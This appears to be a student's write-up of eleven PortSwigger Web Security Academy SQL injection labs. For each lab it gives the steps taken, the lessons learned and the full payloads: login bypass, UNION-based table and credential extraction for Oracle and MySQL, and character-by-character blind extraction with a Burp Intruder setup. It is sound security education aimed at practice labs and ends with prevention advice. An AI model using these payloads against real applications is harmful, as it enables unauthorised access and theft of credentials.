# PortSwigger Web Security Academy Labs
### Solved by: Naman Yuvraj

B.Tech Cybersecurity Engineering Student | Application Security Learner  
**College:** Rungta College of Engineering and Technology, Bhilai  
**Tools:** Burp Suite Professional | Kali Linux | Firefox

---

## Progress Tracker

| Topic | Total Labs | Completed | Status |
|-------|-----------|-----------|--------|
| SQL Injection | 18 | 11 | 🔄 In Progress |
| Authentication | 14 | 0 | ⏳ Upcoming |
| Access Control | 13 | 0 | ⏳ Upcoming |
| XSS | 30 | 0 | ⏳ Upcoming |
| CSRF | 8 | 0 | ⏳ Upcoming |
| SSRF | 7 | 0 | ⏳ Upcoming |
| XXE | 9 | 0 | ⏳ Upcoming |
| **Total** | **99** | **11** | |

---

## SQL Injection Labs

### Lab 1 — SQL Injection in WHERE Clause (Hidden Data) ✅
**Difficulty:** Apprentice  
**Vulnerability:** SQL Injection in product category filter

**What I did:**
- Opened Burp Suite and intercepted the product category GET request
- Found category parameter vulnerable to SQL injection
- Injected payload to make WHERE clause always true
- Retrieved all hidden and unreleased products from database

**Payload Used:**
```
'1 or 1=1--
```

**What I Learned:**
- How SQL injection works in GET parameters
- OR 1=1 makes the entire WHERE clause always true
- Double dash (--) comments out the rest of SQL query
- Hidden database records can be retrieved via SQLi

---

### Lab 2 — SQL Injection Login Bypass ✅
**Difficulty:** Apprentice  
**Vulnerability:** SQL Injection in login form

**What I did:**
- Intercepted the login POST request in Burp Suite
- Modified the username field with SQL injection payload
- Successfully logged in as administrator without knowing password

**Payload Used:**
```
administrator' or 1=1--
```

**What I Learned:**
- SQL comment (--) ignores everything after it including password check
- Authentication can be completely bypassed using SQLi
- Never trust user input in login forms
- Parameterized queries prevent this attack

---

### Lab 3 — SQL Injection — Oracle Database Version ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection on Oracle database

**What I did:**
- Used ORDER BY to determine number of columns returned
- Used UNION SELECT with FROM DUAL (required in Oracle)
- Queried v$version table to extract Oracle database version

**Payloads Used:**
```
-- Step 1: Find number of columns
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--   (error appeared = 2 columns confirmed)

-- Step 2: Confirm UNION works with Oracle syntax
'+UNION+SELECT+NULL,NULL+FROM+DUAL--

-- Step 3: Extract Oracle version
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
```

**What I Learned:**
- Oracle database requires FROM clause in every SELECT
- FROM DUAL used when no real table needed
- v$version table stores Oracle database version info
- Oracle syntax differs significantly from MySQL/MSSQL

---

### Lab 4 — SQL Injection — MySQL and Microsoft Database Version ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection on MySQL/MSSQL database

**What I did:**
- Identified MySQL/Microsoft database from error messages
- Used UNION attack to extract database version
- Used @@version global variable to get version string

**Payloads Used:**
```
-- Step 1: Find number of columns
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--   (error = 2 columns)

-- Step 2: Find which column is string type
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--

-- Step 3: Extract version
'+UNION+SELECT+@@version,NULL--
```

**What I Learned:**
- @@version works in both MySQL and Microsoft SQL Server
- MySQL uses # or -- for comments
- Different databases have different version functions
- Error messages reveal which database is being used

---

### Lab 5 — SQL Injection — Database Contents on Non-Oracle ✅
**Difficulty:** Practitioner  
**Vulnerability:** SQL Injection with full database enumeration

**What I did:**
- Listed all tables using information_schema
- Found the users table with login credentials
- Extracted column names from users table
- Retrieved administrator username and password

**Payloads Used:**
```
-- Step 1: List all tables
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

-- Step 2: List columns of users table
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns
+WHERE+table_name='users_abcdef'--

-- Step 3: Extract credentials
'+UNION+SELECT+username,password+FROM+users_abcdef--
```

**What I Learned:**
- information_schema is a metadata database in MySQL/MSSQL/PostgreSQL
- Full database structure can be mapped using SQLi
- Attacker can extract any data from any table
- Critical credentials stored in plaintext are extremely dangerous

---

### Lab 6 — SQL Injection — Database Contents on Oracle ✅
**Difficulty:** Practitioner  
**Vulnerability:** SQL Injection with Oracle database enumeration

**What I did:**
- Listed all tables using Oracle specific all_tables view
- Found users table and queried all_tab_columns for column names
- Extracted administrator credentials successfully

**Payloads Used:**
```
-- Step 1: List all Oracle tables
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

-- Step 2: List columns of users table
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns
+WHERE+table_name='USERS_ABCDEF'--

-- Step 3: Extract credentials
'+UNION+SELECT+USERNAME,PASSWORD+FROM+USERS_ABCDEF--
```

**What I Learned:**
- Oracle uses all_tables instead of information_schema.tables
- Oracle uses all_tab_columns instead of information_schema.columns
- Oracle table and column names are stored in UPPERCASE
- Each database has its own metadata tables

---

### Lab 7 — UNION Attack: Number of Columns ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection — column count

**What I did:**
- Used ORDER BY technique to determine exact column count
- Switched to UNION SELECT NULL method to confirm
- Identified that query returns exactly 2 columns

**Payloads Used:**
```
-- Method 1: ORDER BY (increment until error)
'+ORDER+BY+1--   (no error)
'+ORDER+BY+2--   (no error)
'+ORDER+BY+3--   (error = 2 columns confirmed)

-- Method 2: UNION SELECT NULL (add NULLs until works)
'+UNION+SELECT+NULL--         (error)
'+UNION+SELECT+NULL,NULL--    (worked = 2 columns)
```

**What I Learned:**
- UNION attack requires matching number of columns
- ORDER BY is fastest method to find column count
- NULL works for any data type unlike specific values
- Error messages confirm when column count is wrong

---

### Lab 8 — UNION Attack: Finding Text Column ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection — text column identification

**What I did:**
- Already knew 2 columns exist from previous technique
- Tested each column position with a string value
- Identified which column accepts and displays string data

**Payloads Used:**
```
-- Test column 1 for string
'+UNION+SELECT+'abcdef',NULL--   (error = not string)

-- Test column 2 for string
'+UNION+SELECT+NULL,'abcdef'--   (worked = column 2 is string)
```

**What I Learned:**
- Not all database columns can hold string data
- Must identify correct column before extracting data
- Integer columns reject string values causing errors
- Only string-compatible columns display injected data

---

### Lab 9 — UNION Attack: Retrieving Data From Other Tables ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection — cross table data extraction

**What I did:**
- Confirmed 2 columns exist and both accept strings
- Directly queried users table using UNION
- Extracted all usernames and passwords in one query
- Logged in as administrator with extracted credentials

**Payload Used:**
```
'+UNION+SELECT+username,password+FROM+users--
```

**What I Learned:**
- UNION allows reading data from completely different tables
- Both columns were string type making extraction easier
- Real world impact: complete account takeover
- This is why SQL injection is ranked #1 in OWASP Top 10

---

### Lab 10 — UNION Attack: Multiple Values in Single Column ✅
**Difficulty:** Practitioner  
**Vulnerability:** UNION based SQL Injection — string concatenation

**What I did:**
- Found only one string column available in query
- Used string concatenation to combine username and password
- Used tilde (~) as separator to split values in output
- Successfully extracted all credentials in one column

**Payloads Used:**
```
-- Oracle database syntax:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

-- MySQL database syntax:
'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users--
```

**What I Learned:**
- String concatenation bypasses single column limitation
- Oracle uses || operator for concatenation
- MySQL uses CONCAT() function for concatenation
- Separator character helps identify username vs password in output

---

### Lab 11 — Blind SQL Injection with Conditional Responses ✅
**Difficulty:** Practitioner  
**Vulnerability:** Blind SQL Injection using boolean responses

**What I did:**
- Found TrackingId cookie was vulnerable to Blind SQLi
- Used "Welcome back" message as true/false indicator
- Confirmed users table and administrator user exist
- Found exact password length using binary search
- Extracted full password character by character using Burp Intruder

**Payloads Used:**
```
-- Step 1: Confirm Blind SQLi exists
xyz' AND '1'='1    --> Welcome back shown (TRUE)
xyz' AND '1'='2    --> Welcome back hidden (FALSE)

-- Step 2: Confirm users table exists
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

-- Step 3: Confirm administrator user exists
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

-- Step 4: Find password length
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a

-- Step 5: Extract each character
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='b
(repeat for each character position)
```

**Burp Suite Intruder Setup Used:**
```
Attack Type  : Cluster Bomb
Payload 1    : Character position (1 to 20)
Payload 2    : Character values (a-z and 0-9)
Grep Match   : Welcome back
Result       : Matched rows = correct characters
```

**What I Learned:**
- Blind SQLi works even when no data displayed on screen
- Boolean based extraction uses true/false application responses
- Password extracted one character at a time using SUBSTRING
- Burp Suite Pro Intruder automates the full extraction
- Blind SQLi is slower but equally dangerous as normal SQLi

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Request interception, Repeater, Intruder |
| Kali Linux | Testing environment |
| Firefox | Browser with Burp proxy |

---

## Key Takeaways

- SQL Injection is still the most critical web vulnerability
- Different databases have different syntax but same core concept
- Blind SQLi is just as dangerous even without visible output
- Burp Suite Pro massively speeds up exploitation
- Prevention: Always use parameterized queries and prepared statements
- Input validation alone is never enough to prevent SQLi




  
